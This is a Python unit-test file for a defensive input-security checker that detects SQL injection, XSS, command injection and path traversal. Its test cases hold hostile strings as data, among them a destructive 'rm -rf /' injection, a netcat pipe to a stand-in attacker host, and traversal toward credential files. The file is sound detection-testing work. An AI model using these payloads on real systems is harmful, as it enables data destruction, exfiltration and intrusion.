"""
Unit tests for security checks module.
Tests comprehensive security threat detection and analysis.
"""

import pytest
from validation.security_checks import (
    SecurityThreat,
    SecurityChecker,
    InjectionDetector,
    ThreatAnalyzer,
    check_request_security
)


class TestSecurityThreat:
    """Test SecurityThreat class."""
    
    def test_create_threat(self):
        """Test creating a security threat."""
        threat = SecurityThreat(
            threat_type='sql_injection',
            severity='critical',
            description='SQL injection detected',
            field='username',
            value="'; DROP TABLE users; --",
            recommendation='Use parameterized queries'
        )
        
        assert threat.threat_type == 'sql_injection'
        assert threat.severity == 'critical'
        assert threat.field == 'username'
        assert threat.recommendation == 'Use parameterized queries'
    
    def test_threat_to_dict(self):
        """Test converting threat to dictionary."""
        threat = SecurityThreat(
            threat_type='xss_injection',
            severity='high',
            description='XSS attempt detected'
        )
        
        threat_dict = threat.to_dict()
        
        assert threat_dict['threat_type'] == 'xss_injection'
        assert threat_dict['severity'] == 'high'
        assert 'timestamp' in threat_dict


class TestSecurityChecker:
    """Test SecurityChecker class."""
    
    def setup_method(self):
        self.checker = SecurityChecker()
    
    def test_check_input_threats_safe(self):
        """Test safe input data."""
        safe_data = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'phone': '(11) 99999-9999'
        }
        
        threats = self.checker.check_input_threats(safe_data)
        assert len(threats) == 0
    
    def test_check_input_threats_sql_injection(self):
        """Test SQL injection detection."""
        malicious_data = {
            'username': "admin'; DROP TABLE users; --",
            'password': "' OR '1'='1"
        }
        
        threats = self.checker.check_input_threats(malicious_data)
        
        sql_threats = [t for t in threats if t.threat_type == 'sql_injection']
        assert len(sql_threats) > 0
        assert any(t.severity == 'critical' for t in sql_threats)
    
    def test_check_input_threats_xss_injection(self):
        """Test XSS injection detection."""
        malicious_data = {
            'comment': "<script>alert('XSS')</script>",
            'description': "javascript:alert(1)"
        }
        
        threats = self.checker.check_input_threats(malicious_data)
        
        xss_threats = [t for t in threats if t.threat_type == 'xss_injection']
        assert len(xss_threats) > 0
        assert any(t.severity == 'high' for t in xss_threats)
    
    def test_check_input_threats_command_injection(self):
        """Test command injection detection."""
        malicious_data = {
            'filename': 'file.txt; rm -rf /',
            'path': '/bin/bash -c "malicious_command"'
        }
        
        threats = self.checker.check_input_threats(malicious_data)
        
        cmd_threats = [t for t in threats if t.threat_type == 'command_injection']
        assert len(cmd_threats) > 0
        assert any(t.severity == 'critical' for t in cmd_threats)
    
    def test_check_input_threats_path_traversal(self):
        """Test path traversal detection."""
        malicious_data = {
            'file': '../../../etc/passwd',
            'path': '..\\..\\windows\\system32\\config\\sam'
        }
        
        threats = self.checker.check_input_threats(malicious_data)
        
        path_threats = [t for t in threats if t.threat_type == 'path_traversal']
        assert len(path_threats) > 0
        assert any(t.severity == 'high' for t in path_threats)
    
    def test_check_input_threats_nested_data(self):
        """Test threat detection in nested data structures."""
        nested_data = {
            'user': {
                'profile': {
                    'bio': "<script>alert('nested XSS')</script>"
                }
            },
            'items': [
                {'name': 'safe item'},
                {'name': "'; DROP TABLE items; --"}
            ]
        }
        
        threats = self.checker.check_input_threats(nested_data)
        
        assert len(threats) > 0
        assert any(t.field.startswith('user.profile.bio') for t in threats)
        assert any('items[1]' in t.field for t in threats)
    
    def test_check_malicious_patterns(self):
        """Test detection of malicious patterns."""
        malicious_data = {
            'upload': 'malware.exe',
            'long_input': 'A' * 15000,  # Buffer overflow attempt
            'unicode_attack': 'test\u0000\u200Bmalicious'
        }
        
        threats = self.checker.check_input_threats(malicious_data)
        
        # Should detect malicious file extension
        file_threats = [t for t in threats if t.threat_type == 'malicious_file']
        assert len(file_threats) > 0
        
        # Should detect buffer overflow attempt
        buffer_threats = [t for t in threats if t.threat_type == 'buffer_overflow']
        assert len(buffer_threats) > 0
        
        # Should detect suspicious unicode
        unicode_threats = [t for t in threats if t.threat_type == 'suspicious_unicode']
        assert len(unicode_threats) > 0


class TestInjectionDetector:
    """Test InjectionDetector class."""
    
    def setup_method(self):
        self.detector = InjectionDetector()
    
    def test_detect_sql_injection_safe(self):
        """Test safe SQL input."""
        safe_inputs = [
            "normal text",
            "user@example.com",
            "123456",
            "Product Name 2024"
        ]
        
        for safe_input in safe_inputs:
            is_malicious, _ = self.detector.detect_sql_injection(safe_input)
            assert not is_malicious
    
    def test_detect_sql_injection_malicious(self):
        """Test malicious SQL injection patterns."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1 OR 1=1",
            "UNION SELECT * FROM passwords",
            "'; EXEC xp_cmdshell('dir'); --",
            "admin'/**/OR/**/1=1#"
        ]
        
        for malicious_input in malicious_inputs:
            is_malicious, reason = self.detector.detect_sql_injection(malicious_input)
            assert is_malicious, f"Failed to detect SQL injection in: {malicious_input}"
            assert reason != "No SQL injection detected"
    
    def test_detect_xss_injection_safe(self):
        """Test safe XSS input."""
        safe_inputs = [
            "normal text",
            "<b>bold text</b>",
            "user@example.com",
            "Price: $25.99"
        ]
        
        for safe_input in safe_inputs:
            is_malicious, _ = self.detector.detect_xss_injection(safe_input)
            assert not is_malicious
    
    def test_detect_xss_injection_malicious(self):
        """Test malicious XSS injection patterns."""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img onerror='alert(1)' src='x'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "on" + "load=malicious()"
        ]
        
        for malicious_input in malicious_inputs:
            is_malicious, reason = self.detector.detect_xss_injection(malicious_input)
            assert is_malicious, f"Failed to detect XSS in: {malicious_input}"
            assert reason != "No XSS injection detected"
    
    def test_detect_command_injection_safe(self):
        """Test safe command input."""
        safe_inputs = [
            "filename.txt",
            "/home/user/documents",
            "configuration setting",
            "parameter=value"
        ]
        
        for safe_input in safe_inputs:
            is_malicious, _ = self.detector.detect_command_injection(safe_input)
            assert not is_malicious
    
    def test_detect_command_injection_malicious(self):
        """Test malicious command injection patterns."""
        malicious_inputs = [
            "file.txt; rm -rf /",
            "input | nc attacker.com 1234",
            "$(malicious_command)",
            "/bin/bash -c 'evil'",
            "powershell.exe -Command 'Get-Process'"
        ]
        
        for malicious_input in malicious_inputs:
            is_malicious, reason = self.detector.detect_command_injection(malicious_input)
            assert is_malicious, f"Failed to detect command injection in: {malicious_input}"
            assert reason != "No command injection detected"


class TestThreatAnalyzer:
    """Test ThreatAnalyzer class."""
    
    def setup_method(self):
        self.analyzer = ThreatAnalyzer()
    
    def test_analyze_threats_empty(self):
        """Test analyzing empty threat list."""
        analysis = self.analyzer.analyze_threats([])
        
        assert analysis['total_threats'] == 0
        assert analysis['risk_score'] == 0
        assert not analysis['action_required']
        assert len(analysis['recommendations']) == 0
    
    def test_analyze_threats_single(self):
        """Test analyzing single threat."""
        threat = SecurityThreat(
            threat_type='sql_injection',
            severity='critical',
            description='SQL injection detected'
        )
        
        analysis = self.analyzer.analyze_threats([threat])
        
        assert analysis['total_threats'] == 1
        assert analysis['risk_score'] == 10  # Critical = 10 points
        assert analysis['action_required'] is True
        assert 'sql_injection' in analysis['threat_types']
        assert analysis['threat_types']['sql_injection'] == 1
    
    def test_analyze_threats_multiple(self):
        """Test analyzing multiple threats."""
        threats = [
            SecurityThreat('sql_injection', 'critical', 'SQL detected'),
            SecurityThreat('xss_injection', 'high', 'XSS detected'),
            SecurityThreat('path_traversal', 'medium', 'Path traversal detected'),
            SecurityThreat('suspicious_unicode', 'low', 'Unicode detected')
        ]
        
        analysis = self.analyzer.analyze_threats(threats)
        
        assert analysis['total_threats'] == 4
        assert analysis['risk_score'] == 22  # 10 + 7 + 4 + 1
        assert analysis['action_required'] is True
        
        # Check severity breakdown
        severity = analysis['severity_breakdown']
        assert severity['critical'] == 1
        assert severity['high'] == 1
        assert severity['medium'] == 1
        assert severity['low'] == 1
    
    def test_generate_recommendations(self):
        """Test recommendation generation."""
        threats = [
            SecurityThreat('sql_injection', 'critical', 'SQL detected'),
            SecurityThreat('xss_injection', 'high', 'XSS detected')
        ]
        
        analysis = self.analyzer.analyze_threats(threats)
        recommendations = analysis['recommendations']
        
        # Should include specific recommendations for detected threat types
        sql_recommendations = [r for r in recommendations if 'parameterized' in r.lower()]
        xss_recommendations = [r for r in recommendations if 'encoding' in r.lower() or 'csp' in r.lower()]
        
        assert len(sql_recommendations) > 0
        assert len(xss_recommendations) > 0
    
    def test_get_threat_summary(self):
        """Test threat summary generation."""
        threats = [
            SecurityThreat('sql_injection', 'critical', 'SQL detected'),
            SecurityThreat('xss_injection', 'high', 'XSS detected')
        ]
        
        summary = self.analyzer.get_threat_summary(threats)
        
        assert "2 security threat" in summary
        assert "IMMEDIATE ACTION REQUIRED" in summary
        assert "critical" in summary.lower()
        assert "high" in summary.lower()
    
    def test_get_threat_summary_empty(self):
        """Test summary for no threats."""
        summary = self.analyzer.get_threat_summary([])
        assert summary == "No security threats detected."


class TestCheckRequestSecurity:
    """Test convenience function for request security checking."""
    
    def test_check_request_security_safe(self):
        """Test safe request data."""
        safe_data = {
            'name': 'John Doe',
            'email': 'john@example.com',
            'message': 'Hello, this is a safe message.'
        }
        
        result = check_request_security(safe_data)
        
        assert result['total_threats'] == 0
        assert result['risk_score'] == 0
        assert not result['action_required']
        assert len(result['threats']) == 0
    
    def test_check_request_security_malicious(self):
        """Test malicious request data."""
        malicious_data = {
            'username': "admin'; DROP TABLE users; --",
            'comment': "<script>alert('XSS')</script>",
            'file': '../../../etc/passwd'
        }
        
        result = check_request_security(malicious_data, 'login_attempt')
        
        assert result['total_threats'] > 0
        assert result['risk_score'] > 0
        assert result['action_required'] is True
        assert len(result['threats']) > 0
        assert 'summary' in result
        
        # Check that different threat types are detected
        threat_types = {t['threat_type'] for t in result['threats']}
        assert 'sql_injection' in threat_types
        assert 'xss_injection' in threat_types
        assert 'path_traversal' in threat_types
    
    def test_check_request_security_with_context(self):
        """Test security checking with context."""
        data = {'query': "SELECT * FROM users"}
        
        result = check_request_security(data, 'database_query')
        
        # Should detect SQL patterns even in legitimate contexts
        assert 'analysis_timestamp' in result
        assert isinstance(result['threats'], list)